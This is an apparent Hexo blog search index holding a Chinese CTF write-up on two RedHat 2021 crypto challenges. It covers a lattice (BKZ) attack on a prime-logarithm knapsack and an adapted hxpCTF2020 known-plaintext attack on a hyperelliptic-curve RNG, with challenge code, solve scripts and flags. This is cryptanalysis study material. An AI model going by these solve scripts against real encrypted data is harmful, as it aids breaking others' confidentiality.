<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>20210509 RedhatCrypto方向WP</title>
    <url>/posts/e881af84/</url>
    <content><![CDATA[<p>emmmmm发现都是原题，当时还不善用搜索引擎，打得不怎么样</p>
<span id="more"></span>

<h1 id="20210509-RedhatCrypto方向WP"><a href="#20210509-RedhatCrypto方向WP" class="headerlink" title="20210509 RedhatCrypto方向WP"></a>20210509 RedhatCrypto方向WP</h1><h2 id="primegame（recuring）"><a href="#primegame（recuring）" class="headerlink" title="primegame（recuring）"></a>primegame（recuring）</h2><h3 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="built_in">len</span>(flag) == <span class="number">48</span>)</span><br><span class="line">msg1 = flag[:<span class="number">24</span>]</span><br><span class="line">msg2 = flag[<span class="number">24</span>:]                        </span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">100</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1)):</span><br><span class="line">    keys.append(Decimal(primes[i]).ln())</span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg1):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)                  </span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg2):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ct1 = 597952043660446249020184773232983974017780255881942379044454676980646417087515453</span><br><span class="line">ct2 = 425985475047781336789963300910446852783032712598571885345660550546372063410589918</span><br></pre></td></tr></table></figure>

<h3 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a>二、解题思路</h3><p>这道题原本的思路是加一个底数e，然后依次逼近msg里的各个值的</p>
<img alt="README-ea39f5b9.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-ea39f5b9.png" width="" height="" >

<p>但是几次给我sage跑挂了，应该是精度和容量问题，而且sage不支持decimal设置精度</p>
<p>然后想到之前有道类似的题目，因为它这里一直在c乘以keys[i]，有24组，所以就想到了格，构造一个类似这样子的格</p>
<img alt="README-423b7374.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-423b7374.png" width="" height="" >

<p>先是得到我们的对数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">100</span>         <span class="comment"># 设置精度</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    keys.append(Decimal(primes[i]).ln())</span><br></pre></td></tr></table></figure>

<p>然后将矩阵第一列求出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    keys[i] = keys[i]*<span class="number">2</span>**<span class="number">256</span></span><br><span class="line"><span class="comment"># keys = [Decimal(&#x27;80260960185991308862233904206310070533990667611589946606122867505419956976171.90515840808613629846290&#x27;), Decimal(&#x27;127210612166669937440098469708903225618405881204503139663605609326034899514764.6663743746583129556012&#x27;), Decimal(&#x27;186360178378489239360019555208872516895923557828929525429878875918225512971166.4414609219754360277383&#x27;), Decimal(&#x27;225321001627212097357564035919404985096695078055324870037864774600825628967482.2417219510600154726596&#x27;), Decimal(&#x27;277657303409607584257674154656459195924000370301674371438196861060248384105244.3993444331039604677255&#x27;), Decimal(&#x27;297000844888383098784779809484430885883324243241834148304083596811292939014380.4674208212385311778134&#x27;), Decimal(&#x27;328063692363312405002199287825630301497469991361288129915249443621480610038009.0012924032254942097990&#x27;), Decimal(&#x27;340942741029472675751209085563496509709453734782185827155063370803195952763341.5492681559934516393628&#x27;), Decimal(&#x27;363065426053956876789136573439806831974720562089628946045509535722562500188081.9345554269406941498189&#x27;), Decimal(&#x27;389906219234236504589839583602940131460157322576695243167328885608693810978037.4477298393894375836391&#x27;), Decimal(&#x27;397628552821546031788284866976481005071491904149911534621248760160933669557251.4099945654069429986781&#x27;), Decimal(&#x27;418115729169523563213795873608243120399117141324174913328486917994007765693981.2677229007073901042419&#x27;), Decimal(&#x27;430002268137029940210248704949846802606196021901113383903617291334026458415238.4390037473159660462055&#x27;), Decimal(&#x27;435517219435792978548914327540992832715555899417703687725132714593809971489386.4866743125661788819556&#x27;), Decimal(&#x27;445816634674050036737403156155461234669588861822924489511566801569753428925196.7122521424369127568677&#x27;), Decimal(&#x27;459728395552222169203258553855093151725069310363221663578223702572833827483180.5712997266924709004859&#x27;), Decimal(&#x27;472146579573229247119622639984879073370128462957392372371001752039887754216862.2605246111880684783030&#x27;), Decimal(&#x27;476006673323706912851925923936227700248085741335072682402231383534286110106849.6653976943352393620303&#x27;), Decimal(&#x27;486870143000003523136729364348591878682677901545106867214896561445453739365505.3439314072483902595509&#x27;), Decimal(&#x27;493584608712480022671713045430033257561446779236439588774651853861690675528490.3655085296010121315316&#x27;), Decimal(&#x27;496801262478540279019120702773153789961300482567894655561867654179758267817025.5210934638564971187839&#x27;), Decimal(&#x27;505947495650660962867352926325259167807382070922044420606608075589355194666475.2011794828006546336392&#x27;), Decimal(&#x27;511666785983460201877755690981276626403123717604080991115075395552267140888834.5141513226162039281301&#x27;), Decimal(&#x27;519748583077886948223642831481589001894608334341623554432584379082164654601617.7552630658083904530520&#x27;)]</span></span><br></pre></td></tr></table></figure>

<p>这里因为格式的种种问题，直接将keys取整数提出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">keys = [<span class="number">80260960185991308862233904206310070533990667611589946606122867505419956976171</span>, <span class="number">127210612166669937440098469708903225618405881204503139663605609326034899514764</span>, <span class="number">186360178378489239360019555208872516895923557828929525429878875918225512971166</span>, <span class="number">225321001627212097357564035919404985096695078055324870037864774600825628967482</span>, <span class="number">277657303409607584257674154656459195924000370301674371438196861060248384105244</span>, <span class="number">297000844888383098784779809484430885883324243241834148304083596811292939014380</span>, <span class="number">328063692363312405002199287825630301497469991361288129915249443621480610038009</span>, <span class="number">340942741029472675751209085563496509709453734782185827155063370803195952763341</span>, <span class="number">363065426053956876789136573439806831974720562089628946045509535722562500188081</span>, <span class="number">389906219234236504589839583602940131460157322576695243167328885608693810978037</span>, <span class="number">397628552821546031788284866976481005071491904149911534621248760160933669557251</span>, <span class="number">418115729169523563213795873608243120399117141324174913328486917994007765693981</span>, <span class="number">430002268137029940210248704949846802606196021901113383903617291334026458415238</span>, <span class="number">435517219435792978548914327540992832715555899417703687725132714593809971489386</span>, <span class="number">445816634674050036737403156155461234669588861822924489511566801569753428925196</span>, <span class="number">459728395552222169203258553855093151725069310363221663578223702572833827483180</span>, <span class="number">472146579573229247119622639984879073370128462957392372371001752039887754216862</span>, <span class="number">476006673323706912851925923936227700248085741335072682402231383534286110106849</span>, <span class="number">486870143000003523136729364348591878682677901545106867214896561445453739365505</span>, <span class="number">493584608712480022671713045430033257561446779236439588774651853861690675528490</span>, <span class="number">496801262478540279019120702773153789961300482567894655561867654179758267817025</span>, <span class="number">505947495650660962867352926325259167807382070922044420606608075589355194666475</span>, <span class="number">511666785983460201877755690981276626403123717604080991115075395552267140888834</span>, <span class="number">519748583077886948223642831481589001894608334341623554432584379082164654601617</span>]</span><br></pre></td></tr></table></figure>

<p>构造格</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = matrix(ZZ, <span class="number">25</span>, <span class="number">25</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    m[i, i]=<span class="number">1</span></span><br><span class="line">    m[<span class="number">24</span>, i] = keys[i]</span><br><span class="line">m[<span class="number">24</span>, <span class="number">24</span>]= -ct1</span><br><span class="line"></span><br><span class="line">c1= m.transpose().BKZ()[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>跑出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1 = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">57</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">49</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">52</span>, <span class="number">99</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">845</span>]</span><br></pre></td></tr></table></figure>

<p>同理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c2 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">125</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">604</span>]</span><br></pre></td></tr></table></figure>

<p>最后转一下ascii</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c2:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="string">&#x27;0x66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;</span>, <span class="number">16</span>)))</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;715c39c3-1b46-4c23-͍<span class="number">8006</span>-27b43eba2446&#125;      ɜ</span><br></pre></td></tr></table></figure>

<p>有点奇怪，把奇怪的地方去掉，就好了</p>
<h2 id="hpcurve（unsolved）"><a href="#hpcurve（unsolved）" class="headerlink" title="hpcurve（unsolved）"></a>hpcurve（unsolved）</h2><p>完全不懂，师傅没必要看了，只是改脚本的屑</p>
<h3 id="一、题目-1"><a href="#一、题目-1" class="headerlink" title="一、题目"></a>一、题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line">R.&lt;x&gt; = GF(p)[]</span><br><span class="line">y=x</span><br><span class="line">f = y + y^<span class="number">7</span></span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line">es = [SystemRandom().randrange(p**<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line">q = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clk</span>():</span></span><br><span class="line">	<span class="keyword">global</span> Ds,es</span><br><span class="line">	Ds = [e*D <span class="keyword">for</span> e,D <span class="keyword">in</span> <span class="built_in">zip</span>(es, Ds)]</span><br><span class="line">	<span class="keyword">return</span> Ds</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    u,v = <span class="built_in">sum</span>(clk())</span><br><span class="line">    rs = [u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] + [v[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> rs <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> rs</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxx&#125;&quot;</span></span><br><span class="line">text = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+flag</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">keys = generate()</span><br><span class="line">leng = <span class="built_in">len</span>(keys)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">    t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keys[i%leng])^^<span class="built_in">ord</span>(x))</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(t.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="comment">#for x,y in zip(RNG(),flag):</span></span><br><span class="line"></span><br><span class="line">flag&#123;1b82f60a-43ab-4f18-8ccc</span><br></pre></td></tr></table></figure>

<h3 id="二、解题脚本"><a href="#二、解题脚本" class="headerlink" title="二、解题脚本"></a>二、解题脚本</h3><p>是hxpCTF2020的题目</p>
<p>原题是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RNG</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.es = [SystemRandom().randrange(p**<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">        self.Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line">        self.q = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clk</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Ds = [e*D <span class="keyword">for</span> e,D <span class="keyword">in</span> <span class="built_in">zip</span>(self.es, self.Ds)]</span><br><span class="line">        <span class="keyword">return</span> self.Ds</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.q:</span><br><span class="line">            u,v = <span class="built_in">sum</span>(self.clk())</span><br><span class="line">            rs = [u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] + [v[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            <span class="keyword">assert</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> rs <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> rs</span><br><span class="line">            self.q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">        r, self.q = self.q[<span class="number">0</span>], self.q[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span> <span class="keyword">return</span> self</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span>(<span class="params">self</span>):</span> <span class="keyword">return</span> self()</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read().strip()</span><br><span class="line"><span class="keyword">import</span> re; <span class="keyword">assert</span> re.match(<span class="string">r&#x27;hxp\&#123;\w+\&#125;&#x27;</span>, flag, re.ASCII)</span><br><span class="line"></span><br><span class="line">text = <span class="string">f&quot;Hello! The flag is: <span class="subst">&#123;flag&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(k^^m <span class="keyword">for</span> k,m <span class="keyword">in</span> <span class="built_in">zip</span>(RNG(), text.encode())).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>显然代码对比起来看，<code>f = y + y^7</code>只是<code>f = y + prod(map(eval, &#39;yyyyyyy&#39;))</code>变换一种形式，主要的不同在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keys[i%leng])^^<span class="built_in">ord</span>(x))</span><br></pre></td></tr></table></figure>

<p>这个key的长度不够，是循环取的</p>
<p>找了一些脚本，没怎么看原理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;a0955c882185b50a69d9d19a24778519d6da23894e667d7130b495b645caac72163d242923caa00af845f25890&#x27;</span>)</span><br><span class="line">known_pt = <span class="string">&#x27;Hello! The flag is: hxp&#123;&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">rng_output = <span class="built_in">bytes</span>(e^^m <span class="keyword">for</span> e,m <span class="keyword">in</span> <span class="built_in">zip</span>(enc, known_pt))</span><br><span class="line"></span><br><span class="line">blocks = [rng_output[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rng_output), <span class="number">8</span>)]</span><br><span class="line">ui = [<span class="built_in">int</span>.from_bytes(r, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> r <span class="keyword">in</span> blocks]</span><br><span class="line">u = x^<span class="number">3</span> + ui[<span class="number">2</span>]*x^<span class="number">2</span> + ui[<span class="number">1</span>]*x + ui[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">L = GF(p).algebraic_closure()</span><br><span class="line">roots = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> u.change_ring(L).roots()]</span><br><span class="line"></span><br><span class="line">RR.&lt;zz&gt; = PolynomialRing(L)</span><br><span class="line">v = RR.lagrange_polynomial([(xi, f(xi).sqrt()) <span class="keyword">for</span> xi <span class="keyword">in</span> roots])</span><br><span class="line">vi = [v.coefficients()[i].as_finite_field_element()[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">vi = [(<span class="built_in">int</span>(-c), <span class="built_in">int</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> vi]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line"></span><br><span class="line">    flag = <span class="built_in">bytes</span>(k^^m <span class="keyword">for</span> k,m <span class="keyword">in</span> <span class="built_in">zip</span>(rng_output+q, enc))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>稍微改了下，<code>enc</code>和<code>known_pt</code>是显然要改的，后者就选24度好了，和原脚本一样，虽然题目给了很大一半</p>
<p>还有就是最后这里，就使得key不要越界，取个余</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    l = rng_output+q</span><br><span class="line">    length = <span class="built_in">len</span>(l)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(l[i % length] ^^ enc[i])</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>不完全正确的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;</span>)</span><br><span class="line">known_pt = (<span class="string">&#x27;a&#x27;</span> * <span class="number">20</span> + <span class="string">&#x27;flag&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line">rng_output = <span class="built_in">bytes</span>(e^^m <span class="keyword">for</span> e,m <span class="keyword">in</span> <span class="built_in">zip</span>(enc, known_pt))</span><br><span class="line"></span><br><span class="line">blocks = [rng_output[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rng_output), <span class="number">8</span>)]</span><br><span class="line">ui = [<span class="built_in">int</span>.from_bytes(r, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> r <span class="keyword">in</span> blocks]</span><br><span class="line">u = x^<span class="number">3</span> + ui[<span class="number">2</span>]*x^<span class="number">2</span> + ui[<span class="number">1</span>]*x + ui[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">L = GF(p).algebraic_closure()</span><br><span class="line">roots = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> u.change_ring(L).roots()]</span><br><span class="line"></span><br><span class="line">RR.&lt;zz&gt; = PolynomialRing(L)</span><br><span class="line">v = RR.lagrange_polynomial([(xi, f(xi).sqrt()) <span class="keyword">for</span> xi <span class="keyword">in</span> roots])</span><br><span class="line">vi = [v.coefficients()[i].as_finite_field_element()[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">vi = [(<span class="built_in">int</span>(-c), <span class="built_in">int</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> vi]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    l = rng_output+q</span><br><span class="line">    length = <span class="built_in">len</span>(l)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(l[i % length] ^^ enc[i])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>出来</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007201746271.png" alt="image-20211007201746271"/>

<p>我看最后一串挺执着的，加上已经知道<code>flag&#123;1b82f60a-43ab-4f18-8ccc</code></p>
<p>大胆连在一起</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;1b82f60a-43ab-4f18-8ccc-97d120aae6fc&#125;</span><br></pre></td></tr></table></figure>

<p>感觉应该是对的</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>格</tag>
      </tags>
  </entry>
  <entry>
    <title>114新闻部工作手册</title>
    <url>/posts/cdf770aa/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="7c456a2d468b6273c572b8bd858baab5856dd55b4a7822f8abeda2d69ac1be94"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
